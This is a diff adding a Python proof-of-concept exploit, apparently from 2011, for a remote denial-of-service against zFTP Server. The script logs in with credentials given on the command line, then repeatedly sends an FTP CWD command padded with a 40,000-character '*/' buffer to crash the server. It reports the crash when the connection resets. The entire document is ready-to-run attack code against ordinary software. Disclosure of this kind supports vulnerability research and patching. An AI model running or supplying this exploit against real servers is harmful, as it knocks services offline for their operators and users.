@@ -1,0 +1,91 @@
+#!/usr/bin/python
+
+# Exploit Title: zFTP Server "cwd" Remote Denial-of-Service
+# Date: 2011-10-24
+# Author: Myo Soe < YGN Ethical Hacker Group, Myanmar - http://yehg.net/ >
+# Version: 2011-04-13 08:59
+# Tested on: Windows XP, 2K3
+
+import socket
+import sys
+import time
+
+author = '(c) Myo Soe < YGN Ethical Hacker Group, Myanmar - http://yehg.net/ >'
+
+# server 
+server = 'zFTP Server version 2011-04-13 08:59'
+title = ' "cwd" Remote Denial-of-Service Proof-of-Concept'
+
+# payload
+
+buffer= '*/' * 20000
+cmd = "CWD"
+payload = cmd + ' ' + buffer
+
+pre_msg = 'Sending STAT DoS ... This may take a while '
+post_msg = 'Job Done!'
+
+
+def trigger(host, port, user, passw):
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(15)
+    
+    try:
+        sock.connect((host, port))
+    except:
+        sys.stderr.write(now() + 'ERROR: Cannot Connect to '+ host + ':' + str(port) + '\r\n')
+        sys.exit(1)
+    r=sock.recv(1024)
+    sock.send("USER " + user + "\r\n")
+    r=sock.recv(1024)
+    sock.send("PASS " + passw + "\r\n")
+    r=sock.recv(1024)
+    if 'Login not accepted' in r:
+        sys.stderr.write(now() + 'ERROR: Incorrect username or password')
+        sys.exit(1)
+            
+    print now(), pre_msg, '\r\n'
+    try:
+        for i in range(1,10):
+            print "#",i
+            sock.send(payload + "\r\n")
+            time.sleep(5)
+    except Exception, err:
+        if 'Connection reset by peer' in str(err):
+            print '\r\n',now(), server, ' has crashed'
+        else:
+            sys.stderr.write('\r\n' + now() + 'ERROR: %s\r\n' % str(err) + '\r\nWait a few seconds to see the server crashed\r\n')
+        
+    sock.close()
+    print '\r\n',now(),post_msg 
+    
+
+def now():
+    return time.strftime("[%Y-%m-%d %X] ")
+    
+
+def banner():
+    print "\r\n",server,title,"\r\n",author,"\r\n\r\n"
+    
+def help():
+    print "Usage: poc.py IP username password"
+
+
+def main():
+    banner()
+
+    if len(sys.argv) <> 4:
+        help()
+        sys.exit(1)
+    else:
+        host = sys.argv[1]
+        user = sys.argv[2]
+        passw = sys.argv[3]
+        trigger(host,21,user,passw)
+        sys.exit(0)
+    
+if __name__ == '__main__':
+    main()
+
+
